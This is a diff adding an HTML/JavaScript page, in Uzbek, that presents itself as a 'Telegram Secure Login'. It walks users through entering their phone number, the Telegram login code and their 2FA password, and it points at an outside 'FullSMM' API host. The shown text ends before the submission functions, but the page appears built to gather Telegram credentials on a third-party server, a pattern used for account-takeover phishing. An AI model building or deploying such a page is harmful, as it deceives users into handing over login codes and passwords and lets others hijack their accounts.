@@ -1,0 +1,1467 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Telegram Secure Login</title>
+
+<style>
+:root{
+  --bg:#0e1621;
+  --card:#17212b;
+  --primary:#2aabee;
+  --text:#e9edef;
+  --muted:#8b9bb4;
+  --danger:#ff6b6b;
+  --success:#4ade80;
+  --radius:16px;
+}
+
+*{box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto, sans-serif; margin:0; padding:0;}
+
+body{
+  margin:0;
+  background:radial-gradient(circle at top,#1b2735,#0e1621);
+  min-height:100vh;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  color:var(--text);
+  padding:20px;
+}
+
+.card{
+  width:100%;
+  max-width:420px;
+  background:var(--card);
+  border-radius:var(--radius);
+  padding:28px;
+  box-shadow:0 30px 60px rgba(0,0,0,.45);
+  animation:fadeIn .5s ease;
+}
+
+@keyframes fadeIn{
+  from{opacity:0;transform:translateY(16px)}
+  to{opacity:1;transform:none}
+}
+
+.logo{
+  width:64px;height:64px;
+  border-radius:50%;
+  background:var(--primary);
+  margin:0 auto 16px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:30px;
+}
+
+h2{text-align:center;margin:6px 0}
+p{text-align:center;font-size:14px;color:var(--muted);margin-bottom:22px}
+
+.step{
+  animation:stepIn .35s ease;
+  display:none;
+}
+.step.active{
+  display:block;
+}
+@keyframes stepIn{
+  from{opacity:0;transform:translateX(20px)}
+  to{opacity:1;transform:none}
+}
+
+.input-group {
+  margin-top: 16px;
+}
+
+input,button{
+  width:100%;
+  padding:14px;
+  border-radius:var(--radius);
+  font-size:15px;
+}
+
+input{
+  background:#0e1621;
+  border:1px solid #22303c;
+  color:var(--text);
+  outline:none;
+  transition:border-color 0.3s;
+}
+
+input:focus{border-color:var(--primary)}
+
+/* Raqam input va kod input uchun maxsus stil */
+input[type="tel"]::-webkit-inner-spin-button,
+input[type="tel"]::-webkit-outer-spin-button,
+input.code-input::-webkit-inner-spin-button,
+input.code-input::-webkit-outer-spin-button {
+  -webkit-appearance: none;
+  margin: 0;
+}
+
+input[type="tel"],
+input.code-input {
+  -moz-appearance: textfield;
+  appearance: textfield;
+}
+
+button{
+  background:var(--primary);
+  border:none;
+  color:white;
+  font-weight:500;
+  cursor:pointer;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:8px;
+  transition:background .2s;
+  margin-top:16px;
+}
+
+button:hover:not(:disabled){background:#1f9fe0}
+button:disabled{opacity:.6;cursor:not-allowed}
+
+.msg{
+  text-align:center;
+  font-size:14px;
+  margin-top:12px;
+  min-height:20px;
+}
+.msg.error{color:var(--danger)}
+.msg.success{color:var(--success)}
+
+.spinner{
+  width:18px;height:18px;
+  border:2px solid rgba(255,255,255,.3);
+  border-top-color:white;
+  border-radius:50%;
+  animation:spin .8s linear infinite;
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+.footer{
+  text-align:center;
+  font-size:12px;
+  color:var(--muted);
+  margin-top:24px;
+  padding-top:16px;
+  border-top:1px solid #22303c;
+}
+
+.back-btn {
+  background:transparent;
+  border:1px solid var(--muted);
+  color:var(--text);
+  margin-top:12px;
+}
+
+.back-btn:hover {
+  background:rgba(139, 155, 180, 0.1);
+}
+
+.code-input {
+  text-align: center;
+  font-size: 18px;
+  letter-spacing: 8px;
+  font-weight: bold;
+}
+
+.warning {
+  background: rgba(255, 107, 107, 0.1);
+  border: 1px solid var(--danger);
+  border-radius: var(--radius);
+  padding: 12px;
+  margin-bottom: 16px;
+  font-size: 13px;
+  color: var(--danger);
+}
+
+.warning.hidden {
+  display: none;
+}
+
+.api-status {
+  position: fixed;
+  top: 20px;
+  right: 20px;
+  background: var(--card);
+  padding: 8px 12px;
+  border-radius: var(--radius);
+  font-size: 12px;
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  box-shadow: 0 4px 12px rgba(0,0,0,.3);
+}
+
+.status-dot {
+  width: 8px;
+  height: 8px;
+  border-radius: 50%;
+}
+
+.status-dot.online {
+  background: var(--success);
+  animation: pulse 2s infinite;
+}
+
+.status-dot.offline {
+  background: var(--danger);
+}
+
+@keyframes pulse {
+  0%, 100% { opacity: 1; }
+  50% { opacity: 0.5; }
+}
+
+.password-input {
+  margin-top: 12px;
+  animation: slideDown 0.3s ease;
+}
+
+@keyframes slideDown {
+  from {
+    opacity: 0;
+    transform: translateY(-10px);
+  }
+  to {
+    opacity: 1;
+    transform: none;
+  }
+}
+
+.info-banner {
+  background: rgba(42, 171, 238, 0.1);
+  border: 1px solid var(--primary);
+  border-radius: var(--radius);
+  padding: 12px;
+  margin-bottom: 16px;
+  font-size: 13px;
+  color: var(--primary);
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.info-banner.hidden {
+  display: none;
+}
+
+/* User Profile Styles */
+.user-profile {
+  text-align: center;
+  animation: slideUp 0.5s ease;
+}
+
+@keyframes slideUp {
+  from {
+    opacity: 0;
+    transform: translateY(20px);
+  }
+  to {
+    opacity: 1;
+    transform: none;
+  }
+}
+
+.user-avatar {
+  width: 100px;
+  height: 100px;
+  border-radius: 50%;
+  background: linear-gradient(135deg, var(--primary), #1f9fe0);
+  margin: 0 auto 20px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 40px;
+  color: white;
+  border: 4px solid rgba(255, 255, 255, 0.1);
+}
+
+.user-name {
+  font-size: 24px;
+  font-weight: 600;
+  margin-bottom: 8px;
+}
+
+.user-phone {
+  color: var(--muted);
+  font-size: 16px;
+  margin-bottom: 24px;
+}
+
+.user-stats {
+  background: rgba(42, 171, 238, 0.05);
+  border-radius: var(--radius);
+  padding: 20px;
+  margin: 20px 0;
+  border: 1px solid rgba(42, 171, 238, 0.1);
+}
+
+.stat-item {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 12px 0;
+  border-bottom: 1px solid rgba(139, 155, 180, 0.1);
+}
+
+.stat-item:last-child {
+  border-bottom: none;
+}
+
+.stat-label {
+  color: var(--muted);
+  font-size: 14px;
+}
+
+.stat-value {
+  font-size: 16px;
+  font-weight: 600;
+  color: var(--primary);
+}
+
+.stars-balance {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  font-size: 18px;
+  color: gold;
+  font-weight: 600;
+}
+
+.star-icon {
+  font-size: 20px;
+}
+
+.account-badge {
+  display: inline-block;
+  padding: 4px 12px;
+  border-radius: 20px;
+  font-size: 12px;
+  font-weight: 500;
+  margin-left: 8px;
+}
+
+.badge-premium {
+  background: linear-gradient(135deg, #fbb034, #ffdd00);
+  color: #000;
+}
+
+.badge-verified {
+  background: linear-gradient(135deg, #00b09b, #96c93d);
+  color: white;
+}
+
+.actions {
+  display: flex;
+  gap: 12px;
+  margin-top: 24px;
+}
+
+.action-btn {
+  flex: 1;
+  padding: 12px;
+  border-radius: var(--radius);
+  background: rgba(42, 171, 238, 0.1);
+  border: 1px solid rgba(42, 171, 238, 0.2);
+  color: var(--primary);
+  cursor: pointer;
+  transition: all 0.3s;
+  font-size: 14px;
+}
+
+.action-btn:hover {
+  background: rgba(42, 171, 238, 0.2);
+  transform: translateY(-2px);
+}
+
+.logout-btn {
+  background: rgba(255, 107, 107, 0.1);
+  border: 1px solid rgba(255, 107, 107, 0.2);
+  color: var(--danger);
+}
+
+.logout-btn:hover {
+  background: rgba(255, 107, 107, 0.2);
+}
+
+.loading-container {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  padding: 40px 0;
+}
+
+.loading-text {
+  margin-top: 16px;
+  color: var(--muted);
+  font-size: 14px;
+}
+
+/* Numeric Keypad Styles */
+.keypad {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  gap: 8px;
+  margin-top: 16px;
+  padding: 12px;
+  background: rgba(0,0,0,0.2);
+  border-radius: var(--radius);
+}
+
+.keypad-btn {
+  background: var(--card);
+  border: 1px solid #22303c;
+  color: var(--text);
+  font-size: 24px;
+  padding: 16px;
+  border-radius: var(--radius);
+  cursor: pointer;
+  transition: background 0.2s;
+}
+
+.keypad-btn:hover {
+  background: rgba(255,255,255,0.1);
+}
+
+.keypad-btn:active {
+  background: rgba(255,255,255,0.2);
+}
+
+/* Klaviaturani to'g'irlash */
+.keypad-btn.zero {
+  grid-column: 2 / span 1; /* Faqat 2-ustunni egallaydi */
+}
+
+/* Bo'sh/Maxsus tugmalar */
+.keypad-btn.placeholder {
+  visibility: hidden; /* Ko'rinmaydi, lekin joyni egallaydi */
+  pointer-events: none;
+}
+.keypad-btn.backspace {
+  font-size: 20px;
+}
+.keypad-btn.plus-btn {
+  font-size: 24px;
+}
+
+/* Country Code Styles */
+.country-group {
+  display: flex;
+  gap: 8px;
+  align-items: center;
+}
+
+.country-code {
+  width: 120px;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  position: relative;
+}
+
+.country-flag {
+  font-size: 20px;
+}
+
+.country-name {
+  color: var(--muted);
+  font-size: 12px;
+  position: absolute;
+  bottom: -20px;
+  white-space: nowrap;
+}
+
+.phone-number {
+  flex: 1;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="card">
+  <div id="loginContainer">
+    <div class="logo">✈️</div>
+    <h2>Telegram orqali kirish</h2>
+    <p id="desc">Xavfsiz autentifikatsiya</p>
+    
+    <div id="tgStep" class="step">
+      <button onclick="shareContact()">📞 Telefon raqamni ulashish</button>
+      <button class="back-btn" onclick="showManualStep()">Boshqa usul</button>
+    </div>
+
+    <div id="manualStep" class="step">
+      <div class="input-group">
+        <div class="country-group">
+          <div class="country-code">
+            <input id="countryCode" placeholder="+998" type="tel" inputmode="tel" maxlength="4">
+            <span id="countryFlag" class="country-flag"></span>
+            <span id="countryName" class="country-name"></span>
+          </div>
+          <input id="phoneNumber" class="phone-number" placeholder="901234567" type="tel" inputmode="tel">
+        </div>
+      </div>
+      <div id="phoneKeypad" class="keypad"></div>
+      <button id="sendCodeBtn" onclick="sendCode()">Davom etish</button>
+      <button class="back-btn" onclick="showTgStep()">Orqaga</button>
+    </div>
+
+    <div id="codeStep" class="step">
+      <div class="info-banner" id="infoBanner" style="display: none;">
+        🔐 Hisobingizda 2FA yoqilgan. Iltimos, parolingizni kiriting.
+      </div>
+      
+      <div class="input-group">
+        <input id="code" placeholder="Telegram kodi" maxlength="5" type="text" inputmode="numeric" class="code-input">
+      </div>
+      <div id="codeKeypad" class="keypad"></div>
+      <button id="verifyCodeBtn" onclick="verifyCode()">Tasdiqlash</button>
+      <button class="back-btn" onclick="showManualStep()">Raqamni o'zgartirish</button>
+    </div>
+
+    <div id="passwordStep" class="step">
+      <div class="info-banner">
+        🔐 Hisobingizda 2FA yoqilgan. Iltimos, parolingizni kiriting.
+      </div>
+      
+      <div class="input-group">
+        <input id="password" placeholder="2FA parol (majburiy)" type="password" inputmode="text">
+      </div>
+      <button id="verifyPasswordBtn" onclick="verifyPassword()">Tasdiqlash</button>
+      <button class="back-btn" onclick="showCodeStep()">Orqaga</button>
+    </div>
+
+    <div id="msg" class="msg"></div>
+    <div class="footer">Telegram Mini App • FullSMM API</div>
+  </div>
+
+  <div id="profileContainer" class="step" style="display: none;">
+    <div class="user-profile" id="userProfileContent">
+      </div>
+  </div>
+</div>
+
+<div id="apiStatus" class="api-status hidden">
+  <div class="status-dot"></div>
+  <span id="apiStatusText"></span>
+</div>
+
+<script>
+// API endpoint - FullSMM API
+const API_BASE = "https://api.fullsmm.uz";
+const API = API_BASE + "/auth";
+let PHONE = null;
+let requires2FA = false;
+let sessionData = null;
+let tempCode = null;
+
+const tgStep = document.getElementById("tgStep");
+const manualStep = document.getElementById("manualStep");
+const codeStep = document.getElementById("codeStep");
+const passwordStep = document.getElementById("passwordStep");
+const countryCodeInput = document.getElementById("countryCode");
+const phoneNumberInput = document.getElementById("phoneNumber");
+const codeInput = document.getElementById("code");
+const passwordInput = document.getElementById("password");
+const msgEl = document.getElementById("msg");
+const desc = document.getElementById("desc");
+const verifyCodeBtn = document.getElementById("verifyCodeBtn");
+const verifyPasswordBtn = document.getElementById("verifyPasswordBtn");
+const sendCodeBtn = document.getElementById("sendCodeBtn");
+const apiStatus = document.getElementById("apiStatus");
+const apiStatusText = document.getElementById("apiStatusText");
+const statusDot = apiStatus.querySelector('.status-dot');
+const countryFlag = document.getElementById("countryFlag");
+const countryName = document.getElementById("countryName");
+
+// Profile elements
+const loginContainer = document.getElementById("loginContainer");
+const profileContainer = document.getElementById("profileContainer");
+const userProfileContent = document.getElementById("userProfileContent");
+
+// Country data (basic list, can be expanded)
+const countries = [
+  // Default O'zbekiston
+  {code: '998', name: "Uzbekistan", flag: "🇺🇿", placeholder: "901234567"},
+  
+  // Major countries from original list
+  {code: '1', name: 'United States', flag: '🇺🇸', placeholder: "123456789"},
+  {code: '44', name: 'United Kingdom', flag: '🇬🇧', placeholder: "123456789"},
+  {code: '49', name: 'Germany', flag: '🇩🇪', placeholder: "123456789"},
+  {code: '33', name: 'France', flag: '🇫🇷', placeholder: "123456789"},
+  {code: '81', name: 'Japan', flag: '🇯🇵', placeholder: "123456789"},
+  {code: '86', name: 'China', flag: '🇨🇳', placeholder: "123456789"},
+  {code: '7', name: 'Russia', flag: '🇷🇺', placeholder: "123456789"},
+  {code: '55', name: 'Brazil', flag: '🇧🇷', placeholder: "123456789"},
+  {code: '61', name: 'Australia', flag: '🇦🇺', placeholder: "123456789"},
+  
+  // Additional European countries
+  {code: '39', name: 'Italy', flag: '🇮🇹', placeholder: "123456789"},
+  {code: '34', name: 'Spain', flag: '🇪🇸', placeholder: "123456789"},
+  {code: '31', name: 'Netherlands', flag: '🇳🇱', placeholder: "123456789"},
+  {code: '41', name: 'Switzerland', flag: '🇨🇭', placeholder: "123456789"},
+  {code: '46', name: 'Sweden', flag: '🇸🇪', placeholder: "123456789"},
+  {code: '47', name: 'Norway', flag: '🇳🇴', placeholder: "123456789"},
+  {code: '45', name: 'Denmark', flag: '🇩🇰', placeholder: "123456789"},
+  {code: '358', name: 'Finland', flag: '🇫🇮', placeholder: "123456789"},
+  {code: '353', name: 'Ireland', flag: '🇮🇪', placeholder: "123456789"},
+  {code: '32', name: 'Belgium', flag: '🇧🇪', placeholder: "123456789"},
+  {code: '43', name: 'Austria', flag: '🇦🇹', placeholder: "123456789"},
+  {code: '48', name: 'Poland', flag: '🇵🇱', placeholder: "123456789"},
+  {code: '420', name: 'Czech Republic', flag: '🇨🇿', placeholder: "123456789"},
+  
+  // Asian countries
+  {code: '91', name: 'India', flag: '🇮🇳', placeholder: "123456789"},
+  {code: '82', name: 'South Korea', flag: '🇰🇷', placeholder: "123456789"},
+  {code: '65', name: 'Singapore', flag: '🇸🇬', placeholder: "123456789"},
+  {code: '60', name: 'Malaysia', flag: '🇲🇾', placeholder: "123456789"},
+  {code: '63', name: 'Philippines', flag: '🇵🇭', placeholder: "123456789"},
+  {code: '66', name: 'Thailand', flag: '🇹🇭', placeholder: "123456789"},
+  {code: '62', name: 'Indonesia', flag: '🇮🇩', placeholder: "123456789"},
+  {code: '84', name: 'Vietnam', flag: '🇻🇳', placeholder: "123456789"},
+  {code: '90', name: 'Turkey', flag: '🇹🇷', placeholder: "123456789"},
+  {code: '92', name: 'Pakistan', flag: '🇵🇰', placeholder: "123456789"},
+  {code: '880', name: 'Bangladesh', flag: '🇧🇩', placeholder: "123456789"},
+  {code: '971', name: 'United Arab Emirates', flag: '🇦🇪', placeholder: "123456789"},
+  {code: '966', name: 'Saudi Arabia', flag: '🇸🇦', placeholder: "123456789"},
+  {code: '972', name: 'Israel', flag: '🇮🇱', placeholder: "123456789"},
+  {code: '98', name: 'Iran', flag: '🇮🇷', placeholder: "123456789"},
+  
+  // Middle East
+  {code: '20', name: 'Egypt', flag: '🇪🇬', placeholder: "123456789"},
+  {code: '962', name: 'Jordan', flag: '🇯🇴', placeholder: "123456789"},
+  {code: '961', name: 'Lebanon', flag: '🇱🇧', placeholder: "123456789"},
+  {code: '974', name: 'Qatar', flag: '🇶🇦', placeholder: "123456789"},
+  {code: '968', name: 'Oman', flag: '🇴🇲', placeholder: "123456789"},
+  
+  // African countries
+  {code: '27', name: 'South Africa', flag: '🇿🇦', placeholder: "123456789"},
+  {code: '234', name: 'Nigeria', flag: '🇳🇬', placeholder: "123456789"},
+  {code: '254', name: 'Kenya', flag: '🇰🇪', placeholder: "123456789"},
+  {code: '233', name: 'Ghana', flag: '🇬🇭', placeholder: "123456789"},
+  {code: '212', name: 'Morocco', flag: '🇲🇦', placeholder: "123456789"},
+  {code: '216', name: 'Tunisia', flag: '🇹🇳', placeholder: "123456789"},
+  
+  // North American countries
+  {code: '1', name: 'Canada', flag: '🇨🇦', placeholder: "123456789"},
+  {code: '52', name: 'Mexico', flag: '🇲🇽', placeholder: "123456789"},
+  {code: '57', name: 'Colombia', flag: '🇨🇴', placeholder: "123456789"},
+  {code: '51', name: 'Peru', flag: '🇵🇪', placeholder: "123456789"},
+  {code: '58', name: 'Venezuela', flag: '🇻🇪', placeholder: "123456789"},
+  {code: '54', name: 'Argentina', flag: '🇦🇷', placeholder: "123456789"},
+  {code: '56', name: 'Chile', flag: '🇨🇱', placeholder: "123456789"},
+  
+  // Central American & Caribbean
+  {code: '506', name: 'Costa Rica', flag: '🇨🇷', placeholder: "123456789"},
+  {code: '507', name: 'Panama', flag: '🇵🇦', placeholder: "123456789"},
+  {code: '502', name: 'Guatemala', flag: '🇬🇹', placeholder: "123456789"},
+  {code: '503', name: 'El Salvador', flag: '🇸🇻', placeholder: "123456789"},
+  {code: '504', name: 'Honduras', flag: '🇭🇳', placeholder: "123456789"},
+  {code: '505', name: 'Nicaragua', flag: '🇳🇮', placeholder: "123456789"},
+  {code: '53', name: 'Cuba', flag: '🇨🇺', placeholder: "123456789"},
+  {code: '1', name: 'Dominican Republic', flag: '🇩🇴', placeholder: "123456789"},
+  {code: '1', name: 'Jamaica', flag: '🇯🇲', placeholder: "123456789"},
+  {code: '1', name: 'Puerto Rico', flag: '🇵🇷', placeholder: "123456789"},
+  
+  // Other South American countries
+  {code: '595', name: 'Paraguay', flag: '🇵🇾', placeholder: "123456789"},
+  {code: '598', name: 'Uruguay', flag: '🇺🇾', placeholder: "123456789"},
+  {code: '591', name: 'Bolivia', flag: '🇧🇴', placeholder: "123456789"},
+  {code: '593', name: 'Ecuador', flag: '🇪🇨', placeholder: "123456789"},
+  
+  // Oceania
+  {code: '64', name: 'New Zealand', flag: '🇳🇿', placeholder: "123456789"},
+  {code: '679', name: 'Fiji', flag: '🇫🇯', placeholder: "123456789"},
+  {code: '675', name: 'Papua New Guinea', flag: '🇵🇬', placeholder: "123456789"},
+  
+  // Other European
+  {code: '351', name: 'Portugal', flag: '🇵🇹', placeholder: "123456789"},
+  {code: '30', name: 'Greece', flag: '🇬🇷', placeholder: "123456789"},
+  {code: '36', name: 'Hungary', flag: '🇭🇺', placeholder: "123456789"},
+  {code: '40', name: 'Romania', flag: '🇷🇴', placeholder: "123456789"},
+  {code: '381', name: 'Serbia', flag: '🇷🇸', placeholder: "123456789"},
+  {code: '385', name: 'Croatia', flag: '🇭🇷', placeholder: "123456789"},
+  {code: '386', name: 'Slovenia', flag: '🇸🇮', placeholder: "123456789"},
+  {code: '421', name: 'Slovakia', flag: '🇸🇰', placeholder: "123456789"},
+  {code: '370', name: 'Lithuania', flag: '🇱🇹', placeholder: "123456789"},
+  {code: '371', name: 'Latvia', flag: '🇱🇻', placeholder: "123456789"},
+  {code: '372', name: 'Estonia', flag: '🇪🇪', placeholder: "123456789"},
+  {code: '373', name: 'Moldova', flag: '🇲🇩', placeholder: "123456789"},
+  {code: '380', name: 'Ukraine', flag: '🇺🇦', placeholder: "123456789"},
+  {code: '375', name: 'Belarus', flag: '🇧🇾', placeholder: "123456789"},
+  
+  // Central Asian (similar to Uzbekistan)
+  {code: '7', name: 'Kazakhstan', flag: '🇰🇿', placeholder: "123456789"},
+  {code: '996', name: 'Kyrgyzstan', flag: '🇰🇬', placeholder: "123456789"},
+  {code: '992', name: 'Tajikistan', flag: '🇹🇯', placeholder: "123456789"},
+  {code: '993', name: 'Turkmenistan', flag: '🇹🇲', placeholder: "123456789"},
+  
+  // Other important countries
+  {code: '850', name: 'North Korea', flag: '🇰🇵', placeholder: "123456789"},
+  {code: '95', name: 'Myanmar', flag: '🇲🇲', placeholder: "123456789"},
+  {code: '880', name: 'Bangladesh', flag: '🇧🇩', placeholder: "123456789"},
+  {code: '94', name: 'Sri Lanka', flag: '🇱🇰', placeholder: "123456789"},
+  {code: '964', name: 'Iraq', flag: '🇮🇶', placeholder: "123456789"},
+  {code: '963', name: 'Syria', flag: '🇸🇾', placeholder: "123456789"},
+  {code: '967', name: 'Yemen', flag: '🇾🇪', placeholder: "123456789"},
+  {code: '970', name: 'Palestine', flag: '🇵🇸', placeholder: "123456789"},
+  {code: '673', name: 'Brunei', flag: '🇧🇳', placeholder: "123456789"},
+  {code: '855', name: 'Cambodia', flag: '🇰🇭', placeholder: "123456789"},
+  {code: '856', name: 'Laos', flag: '🇱🇦', placeholder: "123456789"},
+  {code: '976', name: 'Mongolia', flag: '🇲🇳', placeholder: "123456789"},
+  {code: '677', name: 'Solomon Islands', flag: '🇸🇧', placeholder: "123456789"},
+  {code: '687', name: 'New Caledonia', flag: '🇳🇨', placeholder: "123456789"},
+  {code: '689', name: 'French Polynesia', flag: '🇵🇫', placeholder: "123456789"},
+  
+  // Additional African
+  {code: '251', name: 'Ethiopia', flag: '🇪🇹', placeholder: "123456789"},
+  {code: '255', name: 'Tanzania', flag: '🇹🇿', placeholder: "123456789"},
+  {code: '256', name: 'Uganda', flag: '🇺🇬', placeholder: "123456789"},
+  {code: '260', name: 'Zambia', flag: '🇿🇲', placeholder: "123456789"},
+  {code: '263', name: 'Zimbabwe', flag: '🇿🇼', placeholder: "123456789"},
+  {code: '267', name: 'Botswana', flag: '🇧🇼', placeholder: "123456789"},
+  {code: '268', name: 'Eswatini', flag: '🇸🇿', placeholder: "123456789"},
+  {code: '269', name: 'Comoros', flag: '🇰🇲', placeholder: "123456789"},
+  {code: '291', name: 'Eritrea', flag: '🇪🇷', placeholder: "123456789"},
+  {code: '298', name: 'Faroe Islands', flag: '🇫🇴', placeholder: "123456789"},
+  
+  // Small European countries
+  {code: '376', name: 'Andorra', flag: '🇦🇩', placeholder: "123456789"},
+  {code: '423', name: 'Liechtenstein', flag: '🇱🇮', placeholder: "123456789"},
+  {code: '378', name: 'San Marino', flag: '🇸🇲', placeholder: "123456789"},
+  {code: '379', name: 'Vatican City', flag: '🇻🇦', placeholder: "123456789"},
+  {code: '356', name: 'Malta', flag: '🇲🇹', placeholder: "123456789"},
+  {code: '354', name: 'Iceland', flag: '🇮🇸', placeholder: "123456789"},
+  {code: '350', name: 'Gibraltar', flag: '🇬🇮', placeholder: "123456789"}
+];
+
+/* ====== ENV DETECTION ====== */
+document.addEventListener("DOMContentLoaded", async () => {
+  // API mavjudligini tekshirish
+  await checkAPI();
+  
+  const savedPhone = localStorage.getItem('loggedInPhone');
+  if (savedPhone) {
+    PHONE = savedPhone;
+    await showUserProfile();
+  } else if (window.Telegram && Telegram.WebApp) {
+    Telegram.WebApp.ready();
+    Telegram.WebApp.expand();
+    showTgStep();
+  } else {
+    showManualStep(); 
+  }
+
+  // Create keypads
+  // phoneKeypad va codeKeypad uchun yaratish, passwordKeypad uchun endi yaratilmaydi
+  createKeypad('phoneKeypad', phoneNumberInput, true, countryCodeInput);
+  createKeypad('codeKeypad', codeInput, false);
+});
+
+/* ====== KEYPAD CREATION (YANGILANGAN) ====== */
+function createKeypad(id, input, allowPlus = true, countryInput = null) {
+  const keypad = document.getElementById(id);
+  keypad.innerHTML = '';
+
+  const buttonsOrder = [
+    '1', '2', '3',
+    '4', '5', '6',
+    '7', '8', '9',
+    allowPlus ? '+' : 'empty1', '0', 'backspace'
+  ];
+  
+  buttonsOrder.forEach(key => {
+    const btn = document.createElement('button');
+    btn.className = 'keypad-btn';
+    btn.style.order = buttonsOrder.indexOf(key) + 1; // Joylashuv tartibi
+
+    if (key === 'empty1') {
+        // Bo'sh tugma (Kod kiritishda + belgisi o'rnida)
+        btn.className += ' placeholder';
+        btn.textContent = '';
+        btn.disabled = true;
+    } else if (key === 'backspace') {
+        // Backspace tugmasi
+        btn.className += ' backspace';
+        btn.textContent = '⌫';
+        btn.onclick = () => handleBackspace(input, countryInput);
+    } else if (key === '+') {
+        // Plus tugmasi
+        btn.className += ' plus-btn';
+        btn.textContent = '+';
+        btn.onclick = () => appendToInput(countryInput, '+');
+    } else if (key === '0') {
+        // Nol tugmasi
+        btn.className += ' zero';
+        btn.textContent = '0';
+        btn.onclick = () => handleNumberInput(input, key, countryInput);
+    } else {
+        // Raqam tugmalari (1-9)
+        btn.textContent = key;
+        btn.onclick = () => handleNumberInput(input, key, countryInput);
+    }
+    
+    keypad.appendChild(btn);
+  });
+}
+
+function handleNumberInput(input, key, countryInput) {
+    // Agar manualStep aktiv bo'lsa va countryInput hali to'liq bo'lmasa, raqamni countryInput'ga yozish
+    if (manualStep.classList.contains('active') && countryInput && countryInput.value.length < 4 && input.value.length === 0) {
+        appendToInput(countryInput, key);
+    } else {
+        appendToInput(input, key);
+    }
+}
+
+function handleBackspace(input, countryInput) {
+    if (manualStep.classList.contains('active')) {
+      // Avval raqam maydonidan, keyin kod maydonidan o'chirish
+      if (input.value.length > 0) {
+        removeFromInput(input);
+      } else if (countryInput && countryInput.value.length > 0) {
+        removeFromInput(countryInput);
+      }
+    } else {
+      removeFromInput(input);
+    }
+}
+
+
+function appendToInput(input, char) {
+  // Input kiritish maydonining maxlength'ini tekshirish
+  const maxLength = parseInt(input.getAttribute('maxlength'));
+  if (maxLength && input.value.length >= maxLength) {
+    return;
+  }
+  
+  // CountryCodeInput'ga raqam kiritilganda + belgisi avtomatik qo'yilishi
+  if (input === countryCodeInput && input.value.length === 0 && char !== '+') {
+      input.value = '+' + char;
+  } else {
+      input.value += char;
+  }
+  input.dispatchEvent(new Event('input'));
+}
+
+function removeFromInput(input) {
+  input.value = input.value.slice(0, -1);
+  input.dispatchEvent(new Event('input'));
+}
+
+/* ====== COUNTRY CODE HANDLING ====== */
+countryCodeInput.addEventListener('input', function(e) {
+  let value = this.value;
+  
+  // + belgisi har doim birinchi bo'lishi kerak
+  if (value && !value.startsWith('+')) {
+    value = '+' + value.replace(/[^0-9]/g, '');
+  } else if (value.length > 1) {
+    value = '+' + value.substring(1).replace(/[^0-9]/g, '');
+  }
+  
+  // Maxlength'ni qisqartirish
+  if (value.length > 4) {
+    value = value.substring(0, 4);
+  }
+  
+  this.value = value;
+
+  const code = value.substring(1);
+  updateCountryInfo(code);
+  
+  // Avtomatik ravishda telefon raqam maydoniga o'tish (3 raqamli kod to'liq kiritilganda)
+  if (code.length === 3) {
+      phoneNumberInput.focus();
+  }
+});
+
+function updateCountryInfo(code) {
+  const country = countries.find(c => c.code === code);
+  
+  if (country) {
+      countryFlag.textContent = country.flag;
+      countryName.textContent = country.name;
+      phoneNumberInput.placeholder = country.placeholder;
+  } else {
+      countryFlag.textContent = '';
+      countryName.textContent = 'Noma\'lum davlat kodi';
+      phoneNumberInput.placeholder = "123456789"; // Default placeholder
+  }
+}
+
+/* ====== API CHECK ====== */
+async function checkAPI() {
+  try {
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 5000);
+    
+    const response = await fetch(`${API_BASE}/`, {
+      method: 'GET',
+      signal: controller.signal,
+      headers: { 
+        'Accept': 'application/json'
+      }
+    });
+    
+    clearTimeout(timeoutId);
+    
+    if (response.ok) {
+      updateApiStatus('online', 'API ulandi');
+    } else {
+      throw new Error(`API ${response.status} xatosi`);
+    }
+  } catch (error) {
+    console.warn('API mavjud emas:', error.message);
+    updateApiStatus('offline', 'API ulanmadi');
+    showMessage("API serverga ulanmadi. Iltimos, keyinroq urinib ko'ring.", "error");
+  }
+}
+
+function updateApiStatus(status, message) {
+  apiStatus.classList.remove('hidden');
+  apiStatusText.textContent = message;
+  statusDot.className = 'status-dot ' + status;
+}
+
+/* ====== STEP MANAGEMENT ====== */
+function showTgStep() {
+  hideAllSteps();
+  tgStep.classList.add('active');
+  desc.textContent = "Xavfsiz autentifikatsiya";
+  clearMessage();
+  PHONE = null;
+  requires2FA = false;
+  sessionData = null;
+}
+
+function showManualStep() {
+  hideAllSteps();
+  manualStep.classList.add('active');
+  desc.textContent = "Telefon raqamingizni kiriting";
+  clearMessage();
+  
+  // Default: O'zbekiston (+998)
+  countryCodeInput.value = "+998";
+  updateCountryInfo("998");
+  
+  phoneNumberInput.value = "";
+  countryCodeInput.focus(); // Default fokusni countryCodeInput'ga berish
+  
+  requires2FA = false;
+  sessionData = null;
+}
+
+function showCodeStep() {
+  hideAllSteps();
+  codeStep.classList.add('active');
+  desc.textContent = "Telegram'dan kelgan kodni kiriting";
+  clearMessage();
+  codeInput.value = "";
+  codeInput.focus();
+}
+
+function showPasswordStep() {
+  hideAllSteps();
+  passwordStep.classList.add('active');
+  desc.textContent = "2FA parolni kiriting";
+  clearMessage();
+  passwordInput.value = "";
+  passwordInput.focus();
+  requires2FA = true;
+}
+
+function hideAllSteps() {
+  tgStep.classList.remove('active');
+  manualStep.classList.remove('active');
+  codeStep.classList.remove('active');
+  passwordStep.classList.remove('active');
+}
+
+/* ====== USER PROFILE ====== */
+async function showUserProfile() {
+  loginContainer.style.display = 'none';
+  profileContainer.style.display = 'block';
+  
+  // Loading ko'rsatish
+  userProfileContent.innerHTML = `
+    <div class="loading-container">
+      <div class="spinner" style="width: 32px; height: 32px;"></div>
